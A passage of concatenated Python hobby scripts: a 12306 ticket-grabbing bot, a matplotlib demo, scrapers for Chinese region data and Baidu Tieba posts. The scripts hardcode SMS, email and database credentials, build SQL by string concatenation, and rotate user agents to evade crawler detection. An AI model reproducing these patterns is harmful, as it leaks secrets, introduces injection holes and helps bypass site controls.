                            current_tr = start_time.find_by_xpath('ancestor::tr')
                            if current_tr:
                                car_no = current_tr.find_by_css('.number').text
                                if current_tr.find_by_tag('td')[self.seat_type_index].text == '--':
                                    print('%s无此座位类型出售，继续……' % (car_no + '(' + current_time + ')',))
                                    sleep(0.2)
                                elif current_tr.find_by_tag('td')[self.seat_type_index].text == '无':
                                    print('%s无票，继续尝试……' % (car_no + '(' + current_time + ')',))
                                    sleep(0.2)
                                else:
                                    # 有票，尝试预订
                                    print(car_no + '(' + current_time + ')刷到票了（余票数：' + str(
                                        current_tr.find_by_tag('td')[self.seat_type_index].text) + '），开始尝试预订……')
                                    current_tr.find_by_css('td.no-br>a')[0].click()
                                    sleep(0.5)
                                    key_value = 1
                                    for p in self.passengers:
                                        if '()' in p:
                                            p = p[:-1] + '学生' + p[-1:]
                                        # 选择用户
                                        print('开始选择用户……')
                                        self.driver.find_by_text(p).last.click()
                                        # 选择座位类型
                                        print('开始选择席别……')
                                        if self.seat_type_value != 0:
                                            self.driver.find_by_xpath(
                                                "//select[@id='seatType_" + str(key_value) + "']/option[@value='" + str(
                                                    self.seat_type_value) + "']").first.click()
                                        key_value += 1
                                        sleep(0.2)
                                        if p[-1] == ')':
                                            self.driver.find_by_id('dialog_xsertcj_ok').click()
                                    print('正在提交订单……')
                                    self.driver.find_by_id('submitOrder_id').click()
                                    sleep(2)
                                    # 查看放回结果是否正常
                                    submit_false_info = self.driver.find_by_id('orderResultInfo_id')[0].text
                                    if submit_false_info != '':
                                        print(submit_false_info)
                                        self.driver.find_by_id('qr_closeTranforDialog_id').click()
                                        sleep(0.2)
                                        self.driver.find_by_id('preStep_id').click()
                                        sleep(0.3)
                                        continue
                                    print('正在确认订单……')
                                    self.driver.find_by_id('qr_submit_id').click()
                                    print('预订成功，请及时前往支付……')
                                    # 发送通知信息
                                    self.send_mail(self.receiver_email, '恭喜您，抢到票了，请及时前往12306支付订单！')
                                    self.send_sms(self.receiver_mobile, '您的验证码是：8888。请不要把验证码泄露给其他人。')
                            else:
                                print('不存在当前车次【%s】，已结束当前刷票，请重新开启！' % self.number)
                                sys.exit(1)
                        elif current_time_value > self.my_end_time:
                            break

                except Exception as error_info:
                    print(error_info)
                    # 跳转到抢票页面
                    self.driver.visit(self.ticket_url)
        except Exception as error_info:
            print(error_info)

    def send_sms(self, mobile, sms_info):
        """发送手机通知短信，用的是-互亿无线-的测试短信"""
        host = "106.ihuyi.com"
        sms_send_uri = "/webservice/sms.php?method=Submit"
        account = "C59782899"
        pass_word = "19d4d9c0796532c7328e8b82e2812655"
        params = parse.urlencode(
            {'account': account, 'password': pass_word, 'content': sms_info, 'mobile': mobile, 'format': 'json'}
        )
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        conn = httplib2.HTTPConnectionWithTimeout(host, port=80, timeout=30)
        conn.request("POST", sms_send_uri, params, headers)
        response = conn.getresponse()
        response_str = response.read()
        conn.close()
        return response_str

    def send_mail(self, receiver_address, content):
        """发送邮件通知"""
        # 连接邮箱服务器信息
        host = 'smtp.163.com'
        port = 25
        sender = 'gxcuizy@163.com'  # 你的发件邮箱号码
        pwd = 'FatBoy666'  # 不是登陆密码，是客户端授权密码
        # 发件信息
        receiver = receiver_address
        body = '<h2>温馨提醒：</h2><p>' + content + '</p>'
        msg = MIMEText(body, 'html', _charset="utf-8")
        msg['subject'] = '抢票成功通知！'
        msg['from'] = sender
        msg['to'] = receiver
        s = smtplib.SMTP(host, port)
        # 开始登陆邮箱，并发送邮件
        s.login(sender, pwd)
        s.sendmail(sender, receiver, msg.as_string())


if __name__ == '__main__':
    # 乘客姓名
    passengers_input = input(
        '请输入乘车人姓名，多人用英文逗号“,”连接，（例如单人“张三”或者多人“张三,李四”，如果学生的话输入“王五()”）：')
    passengers = passengers_input.split(",")
    while passengers_input == '' or len(passengers) > 4:
        print('乘车人最少1位，最多4位！')
        passengers_input = input('请重新输入乘车人姓名，多人用英文逗号“,”连接，（例如单人“张三”或者多人“张三,李四”）：')
        passengers = passengers_input.split(",")
    # 乘车日期
    from_time = input('请输入乘车日期（例如“2018-08-08”）：')
    date_pattern = re.compile(r'^\d{4}-\d{2}-\d{2}$')
    while from_time == '' or re.findall(date_pattern, from_time) == []:
        from_time = input('乘车日期不能为空或者时间格式不正确，请重新输入：')
    # 城市cookie字典
    city_list = {
        'bj': '%u5317%u4EAC%2CBJP',  # 北京
        'hd': '%u5929%u6D25%2CTJP',  # 邯郸
        'nn': '%u5357%u5B81%2CNNZ',  # 南宁
        'wh': '%u6B66%u6C49%2CWHN',  # 武汉
        'cs': '%u957F%u6C99%2CCSQ',  # 长沙
        'ty': '%u592A%u539F%2CTYV',  # 太原
        'yc': '%u8FD0%u57CE%2CYNV',  # 运城
        'gzn': '%u5E7F%u5DDE%u5357%2CIZQ',  # 广州南
        'wzn': '%u68A7%u5DDE%u5357%2CWBZ',  # 梧州南
    }
    # 出发站
    from_input = input('请输入出发站，只需要输入首字母就行（例如北京“bj”）：')
    while from_input not in city_list.keys():
        from_input = input('出发站不能为空或不支持当前出发站（如有需要，请联系管理员！），请重新输入：')
    from_station = city_list[from_input]
    # 终点站
    to_input = input('请输入终点站，只需要输入首字母就行（例如北京“bj”）：')
    while to_input not in city_list.keys():
        to_input = input('终点站不能为空或不支持当前终点站（如有需要，请联系管理员！），请重新输入：')
    to_station = city_list[to_input]
    # 出发时间段，最早时间和最晚时间
    my_start = input('请输入乘车的最早时间（例如“9:00”）：')
    while my_start == '':
        my_start = input('乘车的最早时间不能为空，请重新输入：')
    my_end = input('请输入乘车的最晚时间（例如“20:00”）：')
    while my_end == '':
        my_end = input('乘车的最晚时间不能为空，请重新输入：')
    # 座位类型
    seat_type = input('请输入座位类型（例如“软卧”）：')
    while seat_type == '':
        seat_type = input('座位类型不能为空，请重新输入：')
    # 抢票成功，通知该手机号码
    receiver_mobile = input('请预留一个手机号码，方便抢到票后进行通知（例如：18888888888）：')
    mobile_pattern = re.compile(r'^1{1}\d{10}$')
    while receiver_mobile == '' or re.findall(mobile_pattern, receiver_mobile) == []:
        receiver_mobile = input('预留手机号码不能为空或者格式不正确，请重新输入：')
    receiver_email = input('请预留一个邮箱，方便抢到票后进行通知（例如：test@163.com）：')
    while receiver_email == '':
        receiver_email = input('预留邮箱不能为空，请重新输入：')
    # 开始抢票
    ticket = BrushTicket(passengers, from_time, from_station, to_station, my_start, my_end, seat_type, receiver_mobile,
                         receiver_email)
    ticket.start_brush()

# !/usr/bin/env python
# -*- coding: utf-8 -*-

"""
利用matplotlib和numpy绘图
author: gxcuizy
date: 2018-11-14
"""

from matplotlib import pyplot
import numpy


def fun_1():
    """画一个基础x-y的坐标轴"""
    x = numpy.linspace(-1, 1, 50)
    y = 2 * x + 1
    # 定义图像窗口
    pyplot.figure()
    pyplot.plot(x, y)
    # 显示图像
    pyplot.show()


def fun_2():
    """x-y的坐标轴设置属性"""
    x = numpy.linspace(-1, 1, 50)
    y = x ** 2
    # 定义图像窗口
    pyplot.figure()
    # color属性设置颜色，linewidth属性设置线条宽度像素，linestyle属性设置线条样式
    pyplot.plot(x, y, color='red', linewidth=1, linestyle=':')
    # 显示图像
    pyplot.show()


def fun_3():
    """设置坐标轴的范围, 单位长度, 替代文字"""
    x = numpy.linspace(-1, 1, 50)
    y = x ** 2
    # 定义图像窗口
    pyplot.figure()
    # color属性设置颜色，linewidth属性设置线条宽度像素，linestyle属性设置线条样式
    pyplot.plot(x, y, color='red', linewidth=1, linestyle=':')
    # 使用pyplot.xlim()设置x坐标轴范围
    pyplot.xlim(-1, 2)
    # 使用pyplot.ylim()设置y坐标轴范围
    pyplot.ylim(-1, 2)
    # 使用pyplot.xlabel()设置x坐标轴名称
    pyplot.xlabel('this is X')
    # 使用pyplot.ylabel()设置y坐标轴名称
    pyplot.ylabel('this is Y')
    # pyplot.xticks()设置x轴刻度
    # pyplot.yticks()设置y轴刻度
    # 显示图像
    pyplot.show()


def fun_4():
    """设置显示图例"""
    x = numpy.linspace(-1, 1, 50)
    y = x ** 2
    y1 = x * 2 + 1
    # 定义图像窗口
    pyplot.figure()
    # color属性设置颜色，linewidth属性设置线条宽度像素，linestyle属性设置线条样式
    pyplot.plot(x, y, color='red', label='linear line')
    pyplot.plot(x, y1, color='purple', label='upper line')
    # 使用pyplot.xlim()设置x坐标轴范围
    pyplot.xlim(-1, 2)
    # 使用pyplot.ylim()设置y坐标轴范围
    pyplot.ylim(-1, 2)
    # 使用pyplot.xlabel()设置x坐标轴名称
    pyplot.xlabel('this is X')
    # 使用pyplot.ylabel()设置y坐标轴名称
    pyplot.ylabel('this is Y')
    # pyplot.xticks()设置x轴刻度
    # pyplot.yticks()设置y轴刻度
    # pyplot.legend()这是图例显示位置
    pyplot.legend(loc='upper right')
    # 显示图像
    pyplot.show()


def fun_5():
    """移动坐标轴、添加注释"""
    x = numpy.linspace(-3, 3, 50)
    y = x * 2 + 1
    pyplot.figure()
    pyplot.plot(x, y)
    # 设置上和下边框颜色
    ax = pyplot.gca()
    ax.spines['right'].set_color('none')
    ax.spines['top'].set_color('none')
    # 移动坐标轴
    ax.xaxis.set_ticks_position('bottom')
    ax.spines['bottom'].set_position(('data', 0))
    ax.yaxis.set_ticks_position('left')
    ax.spines['left'].set_position(('data', 0))
    # 做一条垂直线
    xx = 1
    yy = 2 * xx + 1
    pyplot.plot([xx, xx, ], [0, yy, ], '--', linewidth=2, color='red')
    pyplot.scatter([xx, ], [yy, ], s=50, color='black')
    # annotate添加注释
    pyplot.annotate(r'$2x+1=%s$' % yy, xy=(xx, yy), xycoords='data', xytext=(+30, -30), textcoords='offset points',
                    fontsize=16, arrowprops=dict(arrowstyle='->', connectionstyle="arc3,rad=.2"))
    # text添加注释
    pyplot.text(-3.4, 3, r'$This\ is\ the\ some\ text.$', fontdict={'size': 16, 'color': 'r'})
    # 显示图像
    pyplot.show()


def fun_6():
    """Scatter 散点图"""
    n = 1024
    # 随机生成1024个x坐标值
    x = numpy.random.normal(0, 1, n)
    # 随机生成1024个y坐标值
    y = numpy.random.normal(0, 1, n)
    # 颜色值
    t = numpy.arctan2(y, x)
    # s为大小，c设置颜色，alpha设置透明度
    pyplot.scatter(x, y, s=20, c=t, alpha=5)
    pyplot.xlim(-1.5, 1.5)
    pyplot.ylim(-1.5, 1.5)
    # 利用pyplot.xtick()、pyplot.ytick()函数来隐藏坐标轴
    pyplot.xticks(())
    pyplot.yticks(())
    # 显示图像
    pyplot.show()


def fun_7():
    """Bar 柱状图"""
    # 生成12个整数
    n = 12
    X = numpy.arange(n)
    # 获取两个随机数据
    y1 = (1 - X / float(n)) * numpy.random.uniform(0.5, 1.0, n)
    y2 = (1 - X / float(n)) * numpy.random.uniform(0.5, 1.0, n)
    pyplot.bar(X, +y1)
    pyplot.bar(X, -y2)
    # 设置x坐标轴
    pyplot.xlim(-5, n)
    pyplot.xticks(())
    # 设置y坐标轴
    pyplot.ylim(-1.25, 1.15)
    pyplot.yticks(())
    # 设置颜色
    pyplot.bar(X, +y1, facecolor='#9999ff', edgecolor='white')
    pyplot.bar(X, -y2, facecolor='#ff9999', edgecolor='white')
    # 添加数值
    for x, y in zip(X, y1):
        pyplot.text(x + 0.4, y + 0.05, '%.2f' % y, ha='center', va='bottom')

    for x, y in zip(X, y2):
        pyplot.text(x + 0.4, -y - 0.05, '%.2f' % y, ha='center', va='top')
    # 显示图像
    pyplot.show()


def fun_8():
    """Image 图片"""
    # 用这样 3x3 的 2D-array 来表示点的颜色
    a = numpy.array(
        [0.313660827978, 0.365348418405, 0.423733120134, 0.365348418405, 0.439599930621, 0.525083754405, 0.423733120134,
         0.525083754405, 0.651536351379]).reshape(3, 3)
    pyplot.imshow(a, interpolation='nearest', cmap='bone', origin='lower')
    pyplot.colorbar(shrink=.92)
    # 去掉xy的刻度
    pyplot.xticks(())
    pyplot.yticks(())
    # 显示图像
    pyplot.show()


# 程序主入口
if __name__ == '__main__':
    fun_8()

# !/usr/bin/env python
# -*- coding: utf-8 -*-

"""
爬取国家统计局最新地址库
省市区三级（Mysql_V2版本）（一张表）
author: gxcuizy
time: 2018-08-24
"""

import requests
from bs4 import BeautifulSoup
import os
import pymysql
from urllib import parse


def get_province(index_href):
    """抓取省份信息"""
    print('开始抓取省份信息……')
    province_url = url + index_href
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
    }
    request = requests.get(province_url, headers=headers)
    request.encoding = 'gbk'
    province_html_text = str(request.text)
    soup = BeautifulSoup(province_html_text, "html.parser")
    province_tr_list = soup.select('.provincetr a')
    # 遍历省份列表信息
    level = '1'
    parent_code = ''
    for province_tr in province_tr_list:
        if province_tr:
            province_href = province_tr.attrs['href']
            province_no = province_href.split('.')[0]
            province_code = province_no + '0000'
            province_name = province_tr.text
            province_info = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                province_name) + '", "' + str(level) + '", "' + str('0') + '", "' + str(province_code) + '");'
            province_id = add_data(province_info)
            # 市级
            get_city(province_href, province_id)
    print('抓取省份信息结束！')


def get_city(province_href, province_id):
    """抓取市级城市信息"""
    print('开始抓取市级信息')
    city_url = url + province_href
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
    }
    request = requests.get(city_url, headers=headers)
    request.encoding = 'gbk'
    city_html_text = str(request.text)
    soup = BeautifulSoup(city_html_text, "html.parser")
    city_tr_list = soup.select('.citytr')
    # 遍历市级城市列表信息
    level = '2'
    for city_tr in city_tr_list:
        if city_tr:
            city_a_info = city_tr.select('a')
            city_href = city_a_info[0].attrs['href']
            city_code = city_a_info[0].text[:6]
            city_name = city_a_info[1].text
            city_info = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                city_name) + '", "' + str(level) + '", "' + str(province_id) + '", "' + str(city_code) + '");'
            city_id = add_data(city_info)
            # 区级
            get_area(city_href, city_id)
    print('抓取市级城市结束！')


def get_area(city_href, city_id):
    """抓取区级信息"""
    print('开始抓取区级信息')
    area_url = url + city_href
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
    }
    request = requests.get(area_url, headers=headers)
    request.encoding = 'gbk'
    area_html_text = str(request.text)
    soup = BeautifulSoup(area_html_text, "html.parser")
    area_tr_list = soup.select('.countytr')
    # 遍历区级列表信息
    level = '3'
    for area_tr in area_tr_list:
        area_a_info = area_tr.select('a')
        if area_a_info:
            area_code = area_a_info[0].text[:6]
            area_href = area_a_info[1].attrs['href']
            area_name = area_a_info[1].text
            area_info = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                area_name) + '", "' + str(level) + '", "' + str(city_id) + '", "' + str(area_code) + '");'
            area_id = add_data(area_info)
            # 街道
            get_town(area_url, area_href, area_id)
    print('抓取区级信息结束！')


def get_town(origin_url, now_url, area_id):
    """获取乡镇地址信息"""
    county_url = parse.urljoin(origin_url, now_url)
    # 解析县区的html
    print('开始解析乡镇级信息……')
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
    }
    request = requests.get(county_url, headers=headers)
    request.encoding = 'gbk'
    contry_html_text = str(request.text)
    soup = BeautifulSoup(contry_html_text, "html.parser")
    town_list = soup.select('.towntr')
    level = '4'
    for town_info in town_list:
        a_info = town_info.find_all(name='a')
        town_name = a_info[1].get_text()
        town_code = a_info[0].get_text()[:9]
        town_sql = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
            town_name) + '", "' + str(level) + '", "' + str(area_id) + '", "' + str(town_code) + '");\n'
        add_data(town_sql)
    print('乡镇级解析结束！')


def add_data(sql):
    """新增一条数据"""
    # 创建一个连接
    db = pymysql.connect(db_host, db_user, db_pw, db_name)
    # 用cursor()创建一个游标对象
    cursor = db.cursor()
    # 插入数据sql
    print('开始新增一条数据：%s' % sql)
    # 执行插入
    cursor.execute(sql)
    # commit()提交执行，如果发生异常，db.rollback()可以回滚
    db.commit()
    insert_id = cursor.lastrowid
    # 关闭连接
    cursor.close()
    db.close()
    print('新增数据成功！')
    return insert_id


# 程序主入口
if __name__ == "__main__":
    # 数据库链接参数
    db_host = '192.168.11.20'
    db_name = 'gshop'
    db_user = 'gshop'
    db_pw = 'T4dABtXMbs'
    url = 'http://www.stats.gov.cn/tjsj/tjbz/tjyqhdmhcxhfdm/2017/'
    # 创建json目录
    mysql_folder = 'mysql_v2/'
    if not os.path.exists(mysql_folder):
        os.makedirs(mysql_folder)
    else:
        # 清空城市和地区
        city_file = open('mysql_v2/area.sql', 'w', encoding='utf-8')
        city_file.write('')
        city_file.close()
    get_province('index.html')

# !/usr/bin/env python
# -*- coding: utf-8 -*-

"""
爬取国家统计局最新地址库
省市区三级（Mysql_V2版本）（一张表）
author: gxcuizy
time: 2018-08-24
"""

import requests
from bs4 import BeautifulSoup
import os
import pymysql
from urllib import parse


def get_province(index_href):
    """抓取省份信息"""
    print('开始抓取省份信息……')
    province_url = url + index_href
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
    }
    request = requests.get(province_url, headers=headers)
    request.encoding = 'gbk'
    province_html_text = str(request.text)
    soup = BeautifulSoup(province_html_text, "html.parser")
    province_tr_list = soup.select('.provincetr a')
    # 遍历省份列表信息
    level = '1'
    parent_code = ''
    for province_tr in province_tr_list:
        if province_tr:
            province_href = province_tr.attrs['href']
            province_no = province_href.split('.')[0]
            province_code = province_no + '0000'
            province_name = province_tr.text
            province_info = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                province_name) + '", "' + str(level) + '", "' + str('0') + '", "' + str(province_code) + '");'
            province_id = add_data(province_info, province_code)
            # 市级
            get_city(province_href, province_id)
    print('抓取省份信息结束！')


def get_city(province_href, province_id):
    """抓取市级城市信息"""
    print('开始抓取市级信息')
    city_url = url + province_href
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
    }
    request = requests.get(city_url, headers=headers)
    request.encoding = 'gbk'
    city_html_text = str(request.text)
    soup = BeautifulSoup(city_html_text, "html.parser")
    city_tr_list = soup.select('.citytr')
    # 遍历市级城市列表信息
    level = '2'
    for city_tr in city_tr_list:
        if city_tr:
            city_a_info = city_tr.select('a')
            city_href = city_a_info[0].attrs['href']
            city_code = city_a_info[0].text[:6]
            city_name = city_a_info[1].text
            city_info = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                city_name) + '", "' + str(level) + '", "' + str(province_id) + '", "' + str(city_code) + '");'
            city_id = add_data(city_info, city_code)
            # 区级
            get_area(city_href, city_id)
    print('抓取市级城市结束！')


def get_area(city_href, city_id):
    """抓取区级信息"""
    print('开始抓取区级信息')
    area_url = url + city_href
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
    }
    request = requests.get(area_url, headers=headers)
    request.encoding = 'gbk'
    area_html_text = str(request.text)
    soup = BeautifulSoup(area_html_text, "html.parser")
    area_tr_list = soup.select('.countytr')
    level = '3'
    # 遍历区级列表信息
    if area_tr_list:
        for area_tr in area_tr_list:
            area_a_info = area_tr.select('a')
            if area_a_info:
                area_code = area_a_info[0].text[:6]
                area_href = area_a_info[1].attrs['href']
                area_name = area_a_info[1].text
                area_info = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                    area_name) + '", "' + str(level) + '", "' + str(city_id) + '", "' + str(area_code) + '");'
                area_id = add_data(area_info, area_code)
                # 街道
                get_town(area_url, area_href, area_id)
        print('抓取区级信息结束！')
    else:
        town_list = soup.select('.towntr')
        for town_info in town_list:
            a_info = town_info.find_all(name='a')
            town_name = a_info[1].get_text()
            town_code = a_info[0].get_text()[:9]
            town_sql = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                town_name) + '", "' + str(level) + '", "' + str(city_id) + '", "' + str(town_code) + '");\n'
            add_data(town_sql, town_code)
        print('乡镇级解析结束！')


def get_town(origin_url, now_url, area_id):
    """获取乡镇地址信息"""
    county_url = parse.urljoin(origin_url, now_url)
    # 解析县区的html
    print('开始解析乡镇级信息……')
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
    }
    request = requests.get(county_url, headers=headers)
    request.encoding = 'gbk'
    contry_html_text = str(request.text)
    soup = BeautifulSoup(contry_html_text, "html.parser")
    town_list = soup.select('.towntr')
    level = '4'
    if town_list:
        for town_info in town_list:
            a_info = town_info.find_all(name='a')
            town_name = a_info[1].get_text()
            town_code = a_info[0].get_text()[:9]
            town_sql = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                town_name) + '", "' + str(level) + '", "' + str(area_id) + '", "' + str(town_code) + '");\n'
            add_data(town_sql, town_code)
        print('乡镇级解析结束！')
    else:
        village_list = soup.select('.villagetr')
        for village_info in village_list:
            a_info = village_info.find_all(name='td')
            village_name = a_info[2].get_text()
            village_code = a_info[0].get_text()
            town_sql = 'INSERT INTO xfc_region_copy (name, level, parent_id, gid) VALUES ("' + str(
                village_name) + '", "' + str(level) + '", "' + str(area_id) + '", "' + str(village_code) + '");\n'
            add_data(town_sql, village_code)
        print('乡镇级解析结束！')


def add_data(sql, region_code):
    """新增一条数据"""
    # 创建一个连接
    db = pymysql.connect(db_host, db_user, db_pw, db_name)
    # 用cursor()创建一个游标对象
    cursor = db.cursor(cursor=pymysql.cursors.DictCursor)
    # 查询该地址数据是否已加入
    cursor.execute('SELECT * FROM `xfc_region_copy` WHERE gid = "' + str(region_code) + '";')
    if cursor.rowcount > 0:
        # 获取单条数据
        info = cursor.fetchone()
        insert_id = info['id']
    else:
        # 插入数据sql
        print('开始新增一条数据：%s' % sql)
        # 执行插入
        cursor.execute(sql)
        # commit()提交执行，如果发生异常，db.rollback()可以回滚
        db.commit()
        insert_id = cursor.lastrowid
    # 关闭连接
    cursor.close()
    db.close()
    print('新增数据成功！')
    return insert_id


# 程序主入口
if __name__ == "__main__":
    # 数据库链接参数
    db_host = '192.168.11.20'
    db_name = 'gshop'
    db_user = 'gshop'
    db_pw = 'T4dABtXMbs'
    url = 'http://www.stats.gov.cn/tjsj/tjbz/tjyqhdmhcxhfdm/2017/'
    # 创建json目录
    mysql_folder = 'mysql_v2/'
    if not os.path.exists(mysql_folder):
        os.makedirs(mysql_folder)
    else:
        # 清空城市和地区
        city_file = open('mysql_v2/area.sql', 'w', encoding='utf-8')
        city_file.write('')
        city_file.close()
    get_province('index.html')

# !/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'WYY'
__date__ = '2017.03.14'

# 实战小项目：百度贴吧爬虫
import urllib2
import requests
import re
import os
import time
import random
from bs4 import BeautifulSoup


# 定义一个Tool()类方便清洗数据
class Tool():
    removeImg = re.compile('<img.*?>|｛7｝|&nbsp;')  # 去除img标签，1-7位空格，&nbsp;
    removeAddr = re.compile('<a.*?>|</a>')  # 删除超链接标签
    replaceLine = re.compile('<tr>|<div>|</div>|</p>')  # 把换行的标签换位\n
    replaceTD = re.compile('<td>')  # 把表格制表<td>换为\t
    replaceBR = re.compile('<br><br>|<br>|</br>|</br></br>')  # 把换行符或者双换行符换为\n
    removeExtraTag = re.compile('.*?')  # 把其余标签剔除
    removeNoneLine = re.compile('\n+')  # 把多余空行删除

    def replace(self, x):
        x = re.sub(self.removeImg, "", x)
        x = re.sub(self.removeAddr, "", x)
        x = re.sub(self.replaceLine, "\n", x)
        x = re.sub(self.replaceTD, "\t", x)
        x = re.sub(self.replaceBR, "\n", x)
        x = re.sub(self.removeExtraTag, "", x)
        x = re.sub(self.removeNoneLine, "\n", x)
        return x.strip()  # 把strip()前后多余内容删除


# 定义一个Spider类
class Spider():
    # 初始化参数
    def __init__(self):
        self.tool = Tool()

    # 获取源码
    def getSource(self, url):
        user_agents = ['Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
                       'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
                       'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ \(KHTML, like Gecko) Element Browser 5.0',
                       'IBM WebExplorer /v0.94', 'Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)',
                       'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
                       'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
                       'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) \Version/6.0 Mobile/10A5355d Safari/8536.25',
                       'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) \Chrome/28.0.1468.0 Safari/537.36',
                       'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; TheWorld)']
        # user_agent在一堆范围中随机获取
        # random.randint()获取随机数，防止网站认出是爬虫而访问受限
        index = random.randint(0, 9)
        user_agent = user_agents[index]
        headers = {'User_agent': user_agent}
        html = requests.get(url, headers=headers)
        return html.text

    # 获取帖子标题
    def getTitle(self, url):
        result = self.getSource(url)
        pattern = re.compile('<h1.*?title.*?>(.*?)</h1>', re.S)
        items = re.search(pattern, result)
        print(u'这篇帖子标题为：', self.tool.replace(items.group(1)))

    # 获取帖子总页数
    def getPageNumber(self, url):
        result = self.getSource(url)
        pattern = re.compile('<ul.*?l_posts_num.*?<span class="red">(.*?)</span>', re.S)
        items = re.search(pattern, result).group(1)
        print(u'帖子共有', items, u'页')
        return items

    # 获取评论内容
    def getContent(self, url):
        result = self.getSource(url)
        pattern = re.compile('<a data-field.*?p_author_name.*?">(.*?)</a>.*?<div id="post_content_.*?>(.*?)</div>',
                             re.S)
        items = re.findall(pattern, result)
        # 获取楼层数可以直接用循环，省去正则匹配的麻烦
        number = 1
        for item in items:
            # item[0]为楼主，item[1]为发言内容，使用\n换行符打出内容更干净利落
            # item[1]中可能有img链接，用自定义Tool工具清洗
            print(u'\n', number, u'楼', u'\n楼主：', item[0], u'\n内容:', self.tool.replace(item[1]))
            time.sleep(0.01)
            number += 1

    # 获取晒图,清洗获得链接并保存入list
    def getImage(self, url):
        result = self.getSource(url)
        soup = BeautifulSoup(result, 'lxml')
        # 此处用BeautifulSoup显然更高效
        # find_all()返回一个list,find()返回一个元素
        # 注意class属性和python内置的重合，所以加_变成class_
        items = soup.find_all('img', class_="BDE_Image")
        images = []
        number = 0
        for item in items:
            print(u'发现一张图，链接为:', item['src'])
            images.append(item['src'])
            number += 1
        if number >= 1:
            print(u'\n', u'共晒图', number, u'张，厉害了我的哥！！！')
        else:
            print(u'喏，没有图......')
        return images

    # 创建目录
    def makeDir(self, path):
        self.path = path.strip()
        E = os.path.exists(os.path.join('F:\Desktop\code\LvXingTieBa', self.path))
        if not E:
            # 创建新目录,若想将内容保存至别的路径（非系统默认），需要更环境变量
            # 更改环境变量用os.chdir()
            os.makedirs(os.path.join('F:\Desktop\code\LvXingTieBa', self.path))
            os.chdir(os.path.join('F:\Desktop\code\LvXingTieBa', self.path))
            print(u'正在创建名为', self.path, u'的文件夹')
            return self.path
        else:
            print(u'名为', self.path, u'的文件夹已经存在...')
            return False

    # 万水千山走遍，接下来就是保存美图
    def saveImage(self, detailURL, name):
        try:
            data = requests.get(detailURL, timeout=10).content
            # 保存文件，一定要用绝对路径      `
            # 所以设置self.path，是为了方便后面函数无障碍调用
        except requests.exceptions.ConnectionError:
            print(u'下载图片失败')
            return None
        fileName = name + '.' + 'jpg'
        f = open(r'F:\Desktop\code\LvXingTieBa\%s\%s' % (self.path, fileName), 'wb')
        f.write(data)
        f.close()
        print(u'成功保存图片', fileName)

    # 集合所有的操作,并获取多页
    def getAllPage(self, Num):
        self.siteURL = 'http://tieba.baidu.com/p/' + str(Num)
        # 获取帖子标题
        self.getTitle(self.siteURL)
        # 获取帖子页数
        numbers = self.getPageNumber(self.siteURL)
        for page in range(1, int(numbers) + 1):
            # 格式化索引链接
            self.url = self.siteURL + '?pn=' + str(page)
            print(u'\n\n', u'正准备获取第', page, u'页的内容...')
            # 获取评论
            print(u'\n', u'正准备获取评论...')
            self.getContent(self.url)
            # 每一页创建一个文件
            self.makeDir(path='page' + str(page))
            # 获取图片
            print(u'\n', u'正准备获取图片...')
            images = self.getImage(self.url)
            print(u'\n', u'正准备保存图片...')
            number = 1
            # 保存图片，先从之前的list中找链接
            for detailURL in images:
                name = 'page' + str(page) + 'num' + str(number)
                self.saveImage(detailURL, name)
                time.sleep(0.1)
                number += 1

            print(u'\n\n', u'完成第', page, u'页')
        print(u'\n\n', u'恭喜，圆满成功！')


# raw_input()实现和外部交互，想看哪个贴就看哪个贴
Num = int(raw_input(u'您好，输入帖子号：'))
spider = Spider()
spider.getAllPage(Num)

# !/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'WYY'
__date__ = '2017.03.13'